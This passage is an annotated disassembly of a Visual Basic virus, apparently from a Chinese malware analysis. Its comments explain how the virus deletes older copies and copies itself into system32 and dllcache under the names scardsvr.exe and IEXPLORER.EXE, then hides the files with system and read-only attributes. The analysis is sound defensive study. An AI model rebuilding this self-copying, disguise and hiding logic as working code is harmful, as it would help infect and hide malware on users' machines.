
```
0000510F:  0D   VCallHresult App.Get_Path()  
00005114:  F5   LitI4: 0 0x0  
00005119:  6C   ILdRf szIE  
0000511C:  1B   LitStr: "\windowsupdate.log"  
0000511F:  2A   ConcatStr  
00005120:  46   CVarStr var_9C  
00005123:  0A   ImpAdCallFPR4 Shell()  ;如果病毒当前目录下存在 windowsupdate.log 文件则执行该程序  
00005128:  74   FStFPR8  
0000512B:  2F   FFree1Str szIE  
0000512E:  1A   FFree1Ad var_88  
00005131:  35   FFree1Var var_9C  
ExitSub_5134:  
00005134:  00   LargeBos  
00005136:  1E   Branch   SubMain_ExitSub  
Next_5139:             ;程序名为不 iexplorer 也不为 scardsvr 则跳到这里  
00005139:  00   LargeBos  
0000513B:  00   LargeBos  
0000513D:  F5   LitI4: 0 0x0  
00005142:  1B   LitStr: "Scripting.FileSystemObject"  
00005145:  04   FLdRfVar var_9C  
00005148:  0A   ImpAdCallFPR4 rtcCreateObject2  
0000514D:  04   FLdRfVar var_9C  
00005150:  04   FLdRfVar var_E0  
00005153:  FE4E SetVarVarFunc  
00005155:  00   LargeBos  
00005157:  28   LitVarI2: 1 0x1 var_CC  
0000515C:  25   PopAdLdVar  
0000515D:  04   FLdRfVar var_E0  
00005160:  FF42 VarLateMemCallLdVar  
00005168:  FC8B PopAd  
0000516A:  F5   LitI4: 7 0x7  
0000516F:  04   FLdRfVar var_9C  
00005172:  3A   LitVarStr: "\iexplorer.exe"  
00005177:  FBEF ConcatVar  
0000517B:  0B   ImpAdCallI2 Dir()  
00005180:  23   FStStrNoPop szIE  
00005183:  1B   LitStr: ""  
00005186:  FB30 EqStr =  
00005188:  2F   FFree1Str szIE  
0000518B:  36   FFreeVar var_9C var_AC  
00005192:  1C   BranchF   ShellExplorer    ;系统目录下的 iexploer.exe 文件存在则执行打开资源管理器操作  
00005195:  00   LargeBos  
00005197:  28   LitVarI2: 1 0x1 var_CC  
0000519C:  25   PopAdLdVar  
0000519D:  04   FLdRfVar var_E0  
000051A0:  FF42 VarLateMemCallLdVar  
000051A8:  FC8B PopAd  
000051AA:  F5   LitI4: 7 0x7  
000051AF:  04   FLdRfVar var_9C  
000051B2:  3A   LitVarStr: "\dllcache\scardsvr.exe"  
000051B7:  FBEF ConcatVar  
000051BB:  0B   ImpAdCallI2 Dir()  
000051C0:  23   FStStrNoPop szIE  
000051C3:  1B   LitStr: ""  
000051C6:  FB3D NeStr <>  
000051C8:  2F   FFree1Str szIE  
000051CB:  36   FFreeVar var_9C var_AC  
000051D2:  1C   BranchF   000051FD  
000051D5:  00   LargeBos  
000051D7:  28   LitVarI2: 1 0x1 var_CC  
000051DC:  25   PopAdLdVar  
000051DD:  04   FLdRfVar var_E0  
000051E0:  FF42 VarLateMemCallLdVar  
000051E8:  3A   LitVarStr: "\dllcache\scardsvr.exe"    ;dllcache 目录下的 scardsvr.exe 存在则删除该文件  
000051ED:  FBEF ConcatVar  
000051F1:  0A   ImpAdCallFPR4 Kill()  
000051F6:  36   FFreeVar var_9C var_AC  
; if dir("%system%\dllcache\scardsvr.exe")<> "" then  
;   kill "%system%\dllcache\scardsvr.exe"  
; End if  
000051FD:  
000051FD:  00   LargeBos  
000051FF:  00   LargeBos  
00005201:  28   LitVarI2: 1 0x1 var_CC  
00005206:  25   PopAdLdVar  
00005207:  04   FLdRfVar var_E0  
0000520A:  FF42 VarLateMemCallLdVar  
00005212:  FC8B PopAd  
00005214:  F5   LitI4: 7 0x7  
00005219:  04   FLdRfVar var_9C  
0000521C:  3A   LitVarStr: "\scardsvr.exe"  
00005221:  FBEF ConcatVar  
00005225:  0B   ImpAdCallI2 Dir()  
0000522A:  23   FStStrNoPop szIE  
0000522D:  1B   LitStr: ""  
00005230:  FB3D NeStr <>  
00005232:  2F   FFree1Str szIE  
00005235:  36   FFreeVar var_9C var_AC  
0000523C:  1C   BranchF   00005267  
0000523F:  00   LargeBos  
00005241:  28   LitVarI2: 1 0x1 var_CC  
00005246:  25   PopAdLdVar  
00005247:  04   FLdRfVar var_E0  
0000524A:  FF42 VarLateMemCallLdVar  
00005252:  3A   LitVarStr: "\scardsvr.exe"  
00005257:  FBEF ConcatVar  
0000525B:  0A   ImpAdCallFPR4 Kill()    ;system32 目录下的 scardsvr.exe 存在则删除该文件  
00005260:  36   FFreeVar var_9C var_AC  
; if dir("%system%\dllcache\scardsvr.exe")<> "" then  
;   kill "%system%\dllcache\scardsvr.exe"  
; End if  
00005267:  
00005267:  00   LargeBos  
00005269:  00   LargeBos  
0000526B:  04   FLdRfVar szIE  
0000526E:  04   FLdRfVar var_88  
00005271:  05   ImpAdLdRf  
00005274:  24   NewIfNullPr  
00005277:  0D   VCallHresult Global.Get_App() As App  
0000527C:  08   FLdPr var_88  
0000527F:  0D   VCallHresult App.Get_Path()  
00005284:  6C   ILdRf szIE  
00005287:  1B   LitStr: "\"  
0000528A:  2A   ConcatStr  
0000528B:  23   FStStrNoPop var_E8  
0000528E:  04   FLdRfVar var_D0  
00005291:  04   FLdRfVar var_E4  
00005294:  05   ImpAdLdRf  
00005297:  24   NewIfNullPr  
0000529A:  0D   VCallHresult Global.Get_App() As App  
0000529F:  08   FLdPr var_E4  
000052A2:  0D   VCallHresult App.Get_EXEName()  
000052A7:  6C   ILdRf var_D0  
000052AA:  2A   ConcatStr  
000052AB:  23   FStStrNoPop var_EC  
000052AE:  1B   LitStr: ".exe"  
000052B1:  2A   ConcatStr  
000052B2:  46   CVarStr var_9C  
000052B5:  25   PopAdLdVar  
000052B6:  04   FLdRfVar var_E0  
000052B9:  FF42 VarLateMemCallLdVar  
000052C1:  04   FLdRfVar var_FC  
000052C4:  FE4E SetVarVarFunc  
000052C6:  32   FFreeStr szIE var_E8 var_D0 var_EC  
000052D1:  29   FFreeAd: var_88 var_E4  
000052D8:  35   FFree1Var var_9C  
000052DB:  00   LargeBos  
000052DD:  28   LitVarI2: 1 0x1 var_CC  
000052E2:  25   PopAdLdVar  
000052E3:  04   FLdRfVar var_E0  
000052E6:  FF42 VarLateMemCallLdVar  
000052EE:  3A   LitVarStr: "\scardsvr.exe"    ;复制病毒自身为%system32%\scardsvr.exe  
000052F3:  FBEF ConcatVar  
000052F7:  25   PopAdLdVar  
000052F8:  04   FLdRfVar var_FC  
000052FB:  FD9F LdPrVar  
000052FD:  FE98 LateMemCall  
00005303:  36   FFreeVar var_9C var_AC  
; CopyFile app.path & "\" & app.exename &".exe",%system32%\scardsvr.exe  
0000530A:  00   LargeBos  
0000530C:  28   LitVarI2: 1 0x1 var_CC  
00005311:  25   PopAdLdVar  
00005312:  04   FLdRfVar var_E0  
00005315:  FF42 VarLateMemCallLdVar  
0000531D:  3A   LitVarStr: "\dllcache\scardsvr.exe"    ;复制病毒自身为%system32%\dllcache\scardsvr.exe  
00005322:  FBEF ConcatVar  
00005326:  25   PopAdLdVar  
00005327:  04   FLdRfVar var_FC  
0000532A:  FD9F LdPrVar  
0000532C:  FE98 LateMemCall  
00005332:  36   FFreeVar var_9C var_AC  
; CopyFile app.path & "\" & app.exename &".exe",%system32%\dllcache\scardsvr.exe  
00005339:  00   LargeBos  
0000533B:  28   LitVarI2: 1 0x1 var_CC  
00005340:  25   PopAdLdVar  
00005341:  04   FLdRfVar var_E0  
00005344:  FF42 VarLateMemCallLdVar  
0000534C:  3A   LitVarStr: "\IEXPLORER.EXE"  
00005351:  FBEF ConcatVar  
00005355:  25   PopAdLdVar  
00005356:  04   FLdRfVar var_FC  
00005359:  FD9F LdPrVar  
0000535B:  FE98 LateMemCall  
00005361:  36   FFreeVar var_9C var_AC  
00005368:  00   LargeBos  
0000536A:  28   LitVarI2: 1 0x1 var_CC  
0000536F:  25   PopAdLdVar  
00005370:  04   FLdRfVar var_E0  
00005373:  FF42 VarLateMemCallLdVar  
0000537B:  3A   LitVarStr: "\scardsvr.exe"    ;设置文件属性为系统隐藏  
; 也就是相当于 vb 中的 SetAttr %system32%\scardsvr.exe,vbHidden Or vbSystem Or vbReadOnly  
00005380:  FBEF ConcatVar  
00005384:  25   PopAdLdVar  
00005385:  04   FLdRfVar var_E0  
00005388:  FF42 VarLateMemCallLdVar  
00005390:  04   FLdRfVar var_FC  
00005393:  FE4E SetVarVarFunc  
00005395:  36   FFreeVar var_9C var_AC  
0000539C:  00   LargeBos  
0000539E:  28   LitVarI2: 7 0x7 var_CC  
000053A3:  25   PopAdLdVar  
000053A4:  04   FLdRfVar var_FC  
000053A7:  FF43 VarLateMemSt  
000053AB:  00   LargeBos  
000053AD:  28   LitVarI2: 1 0x1 var_CC  
000053B2:  25   PopAdLdVar  
000053B3:  04   FLdRfVar var_E0  
000053B6:  FF42 VarLateMemCallLdVar  
000053BE:  3A   LitVarStr: "\iexplorer.exe"    ;设置文件属性为系统隐藏  
```
